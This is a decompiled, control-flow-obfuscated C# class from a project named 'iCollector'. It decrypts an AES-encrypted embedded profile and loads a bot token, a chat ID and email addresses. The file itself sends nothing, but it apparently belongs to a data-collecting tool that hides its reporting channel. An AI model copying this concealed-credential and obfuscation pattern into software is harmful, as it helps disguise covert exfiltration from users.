using System;
using System.Collections.Generic;
using iCollector.Files;
using Newtonsoft.Json.Linq;

namespace iCollector.Util;

internal class ProfileUtils
{
	private static Logger log;

	private static LogContext ctx;

	public static string DEFAULT_ENV;

	public static string BTOKEN;

	public static string BCHATID;

	public static List<string> EMAILS;

	public static List<string> GetEmails()
	{
		return EMAILS;
	}

	public static void Init()
	{
		string dEFAULT_ENV = DEFAULT_ENV;
		if (6u != 0 && 7u != 0)
		{
			InitWithEnv(dEFAULT_ENV);
		}
	}

	public static void InitWithEnv(string env)
	{
		Logger logger = log;
		LogContext logContext = ctx;
		string message = "start init env: " + env;
		if (true && 8u != 0)
		{
			logger.Info(logContext, message);
		}
		byte[] keys = default(byte[]);
		bool flag = default(bool);
		List<DynamicObject>.Enumerator enumerator2 = default(List<DynamicObject>.Enumerator);
		DynamicObject dynamicObject2 = default(DynamicObject);
		do
		{
			if (2u != 0)
			{
				DynamicObject dynamicObject = new DynamicObject(JObject.Parse(Resource1.profiles));
				byte[] array = Convert.FromBase64String(dynamicObject.GetString("k"));
				if (0 == 0 && 0 == 0)
				{
					keys = array;
				}
				List<DynamicObject> array2 = new DynamicObject(JObject.Parse(AesUtils.Decrypt(dynamicObject.GetString("v"), keys))).GetArray("data");
				if (0 == 0)
				{
					flag = false;
				}
				List<DynamicObject>.Enumerator enumerator = array2.GetEnumerator();
				if (0 == 0)
				{
					enumerator2 = enumerator;
				}
				try
				{
					while (true)
					{
						bool num;
						if (0 == 0)
						{
							num = enumerator2.MoveNext();
							if (6 == 0)
							{
								goto IL_00a3;
							}
							if (!num)
							{
								break;
							}
							DynamicObject current = enumerator2.Current;
							if (false)
							{
								goto IL_0092;
							}
							if (6u != 0)
							{
								dynamicObject2 = current;
							}
						}
						if (2u != 0)
						{
							goto IL_0092;
						}
						goto IL_00da;
						IL_00da:
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						if (0 == 0)
						{
							logger2.Info(logContext2, "init env success");
						}
						continue;
						IL_00a3:
						if (!num)
						{
							continue;
						}
						BTOKEN = dynamicObject2.GetString("token");
						BCHATID = dynamicObject2.GetString("chatId");
						EMAILS = dynamicObject2.GetArrayString("emails");
						if (8u != 0 && 0 == 0)
						{
							flag = true;
						}
						goto IL_00da;
						IL_0092:
						num = string.Equals(dynamicObject2.GetString("profileName"), env);
						goto IL_00a3;
					}
				}
				finally
				{
					((IDisposable)enumerator2).Dispose();
				}
			}
			if (!flag && 0 == 0)
			{
				Logger logger3 = log;
				LogContext logContext3 = ctx;
				if (uint.MaxValue != 0)
				{
					logger3.Error(logContext3, "init env failed");
				}
			}
		}
		while (false);
	}

	static ProfileUtils()
	{
		if (0 == 0)
		{
			if (0 == 0 && 4 == 0)
			{
				return;
			}
			log = Logger.Instance();
			ctx = new LogContext("ProfileUtils");
			while (true)
			{
				DEFAULT_ENV = "2";
				if (false)
				{
					break;
				}
				BTOKEN = "";
				if (2 == 0 || 3u != 0)
				{
					BCHATID = "";
					break;
				}
			}
		}
		EMAILS = new List<string>();
	}
}
